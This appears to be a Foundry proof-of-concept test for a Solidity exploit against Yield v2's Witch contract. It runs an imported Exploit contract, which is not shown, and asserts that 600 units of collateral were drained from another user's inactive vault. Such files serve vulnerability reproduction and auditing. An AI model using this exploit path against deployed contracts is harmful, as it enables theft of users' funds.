// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "./16980-yield-v2-witch-buy-payall-no-auction.sol";

contract PoC_16980 is Test {
    function test_payall_drains_excess_from_inactive_vault() public {
        Exploit exploit = new Exploit();
        exploit.run();
        assertEq(exploit.stolenCollateral(), 600);
        (address owner, uint256 collateralAmount, uint256 debt) = exploit.witch().vaults(exploit.vaultId());
        assertEq(owner, address(0xA11CE));
        assertEq(collateralAmount, debt);
        assertEq(collateralAmount, 400);
    }
}
